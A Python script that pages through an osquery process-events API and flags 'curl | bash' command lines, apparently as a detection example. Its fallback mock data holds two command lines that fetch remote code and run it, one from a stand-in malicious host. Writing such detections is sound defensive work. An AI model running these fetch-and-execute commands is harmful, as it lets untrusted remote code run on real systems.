#!/usr/bin/env python3
"""
paginated_osquery_client_env.py
-------------------------------
Demonstrates how to paginate through an API with proper error handling
and environment-based configuration.

Environment variables:
  OSQUERY_API_URL      - Base URL for the osquery API (e.g. https://api.internal/osquery)
  OSQUERY_API_TOKEN    - Bearer token or API key for authentication
  PAGE_SIZE            - (Optional) Number of events to fetch per page, defaults to 50

Usage:
  export OSQUERY_API_URL="https://mock.local/osquery"
  export OSQUERY_API_TOKEN="demo_token"
  export PAGE_SIZE=10
  python3 python/detections/paginated_osquery_client_env.py
"""

import os
import sys
import requests
from typing import List, Dict, Any


def load_config() -> Dict[str, Any]:
    """Load API configuration from environment variables."""
    base_url = os.getenv("OSQUERY_API_URL")
    token = os.getenv("OSQUERY_API_TOKEN")
    page_size = int(os.getenv("PAGE_SIZE", "50"))

    if not base_url or not token:
        print("[ERROR] OSQUERY_API_URL and OSQUERY_API_TOKEN are required environment variables.")
        sys.exit(1)

    return {
        "base_url": base_url.rstrip("/"),
        "headers": {"Authorization": f"Bearer {token}"},
        "page_size": page_size,
    }


def fetch_page(base_url: str, headers: Dict[str, str], params: Dict[str, Any]) -> Dict[str, Any]:
    """Retrieve one page of data and raise for bad status codes."""
    url = f"{base_url}/process_events"
    try:
        resp = requests.get(url, headers=headers, params=params, timeout=5)
        print(f"[DEBUG] GET {resp.url} -> {resp.status_code}")
        resp.raise_for_status()  # raises HTTPError for 4xx/5xx
        return resp.json()
    except requests.exceptions.HTTPError as e:
        print(f"[ERROR] {url} returned {resp.status_code}: {e}")
        return {"events": [], "next_cursor": None}
    except requests.RequestException as e:
        print(f"[WARN] Request error fetching data: {e}")
        # fallback mock data for local demo
        return {
            "events": [
                {"pid": 1, "cmdline": "bash -c 'curl https://malicious.sh | bash'"},
                {"pid": 2, "cmdline": "curl https://legit.sh -o /tmp/x && bash /tmp/x"}
            ],
            "next_cursor": None
        }


def fetch_all_events(cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Iterate over all pages until no next_cursor is returned."""
    all_events = []
    cursor = None
    page_num = 1

    while True:
        params = {"limit": cfg["page_size"]}
        if cursor:
            params["cursor"] = cursor

        print(f"\n--- Fetching page {page_num} ---")
        data = fetch_page(cfg["base_url"], cfg["headers"], params)
        events = data.get("events", [])
        all_events.extend(events)
        cursor = data.get("next_cursor")

        print(f"Fetched {len(events)} events; next_cursor={cursor}")
        if not cursor:
            break
        page_num += 1

    print(f"\n[INFO] Total events collected: {len(all_events)}")
    return all_events


def detect_curl_pipe_bash(events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Basic detection logic example."""
    return [e for e in events if "| bash" in e.get("cmdline", "").lower()]


def main():
    cfg = load_config()
    all_events = fetch_all_events(cfg)
    detections = detect_curl_pipe_bash(all_events)

    print(f"\n[INFO] Suspicious events found: {len(detections)}")
    for ev in detections:
        print(f"PID {ev['pid']}: {ev['cmdline']}")


if __name__ == "__main__":
    main()
